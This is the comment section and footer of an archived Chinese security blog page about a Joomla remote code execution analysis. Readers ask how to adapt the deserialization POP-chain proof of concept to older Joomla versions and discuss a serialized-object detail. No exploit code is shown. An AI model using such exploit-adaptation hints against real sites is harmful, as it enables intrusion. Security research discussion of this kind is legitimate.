+<p class="comment-meta">你好，请教一下<br>1、这个poc是不是只能在3.x下的版本执行？<br/>2、问题1如果是的话，在2.x 版本poc如何构造，我看了下在2.x版本下没有jdatabasedrivermysqli类，在2.x版本与jdatabasedrivermysqli类对应类为jdatabasemysqli类和jdatabasemyssql类的利用magic function不能用于构造pop链，怎么样才能找到可以构造POP链的类?<br/>     问题1的答案如果是否的话，也能在2.x版本或者1.x版本下执行的话，有可能的原因是什么？？<br/>谢谢</br></p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2368">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2016年6月24日 11:47" itemprop="datePublished">
+                            2016 六月 24 11:47
+                        </time>
+<a href="javascript:reply_to('2368', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@xxx：这个我也没研究过，希望你能去研究一下，共同学习~</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2281">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.waitalone.cn" target="_blank">独自等待</a>
+<time datetime="2016年1月5日 17:50" itemprop="datePublished">
+                            2016 一月 05 17:50
+                        </time>
+<a href="javascript:reply_to('2281', '独自等待')">回复</a>
+</p>
+<p class="comment-meta">大牛，分析的不错。。。学习了。</p>
+</div>
+</div>
+<div class="row" id="comment-2273">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/487f87505f619bf9ea08f26bb34f8118.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.23.com" target="_blank">L</a>
+<time datetime="2015年12月28日 17:40" itemprop="datePublished">
+                            2015 十二月 28 17:40
+                        </time>
+<a href="javascript:reply_to('2273', 'L')">回复</a>
+</p>
+<p class="comment-meta">$this-&gt;connection = true;去验证的话<br/>这样的话序列化之后应该是connection";b:1;}吧</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2277">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2016年1月1日 15:35" itemprop="datePublished">
+                            2016 一月 01 15:35
+                        </time>
+<a href="javascript:reply_to('2277', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@L：是吧。<br/>$this-&gt;connection = true;<br/>和<br/>$this-&gt;connection = 1;<br/>效果都一样，我的POC里用的后者。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2272">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">佛山不锈钢管</a>
+<time datetime="2015年12月28日 16:57" itemprop="datePublished">
+                            2015 十二月 28 16:57
+                        </time>
+<a href="javascript:reply_to('2272', '佛山不锈钢管')">回复</a>
+</p>
+<p class="comment-meta">来访啦！</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2278">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/d832f116cafcd2608947371702255c2f.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">mr</a>
+<time datetime="2016年1月2日 00:31" itemprop="datePublished">
+                            2016 一月 02 00:31
+                        </time>
+<a href="javascript:reply_to('2278', 'mr')">回复</a>
+</p>
+<p class="comment-meta">@佛山不锈钢管：搞不锈钢的都跟搞安全有一腿了, 有点看不懂啊......</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2280">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.fssyxc.com" target="_blank">佛山不锈钢管</a>
+<time datetime="2016年1月4日 09:31" itemprop="datePublished">
+                            2016 一月 04 09:31
+                        </time>
+<a href="javascript:reply_to('2280', '佛山不锈钢管')">回复</a>
+</p>
+<p class="comment-meta">@mr：哈哈哈哈。。。。。。</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="c7297f2a9837d74ec7cbbde8b587a6d8f5bffa63"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/c7297f2a9837d74ec7cbbde8b587a6d8f5bffa63"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="374">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="EiVORxhXWEZIrfD4cLn1FMEvIUwSuhkbcCgkF1tcnrT7rU1j02RLeqGARYZ0dL9l"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./Joomla远程代码执行漏洞分析（总结）  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./Joomla远程代码执行漏洞分析（总结）  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
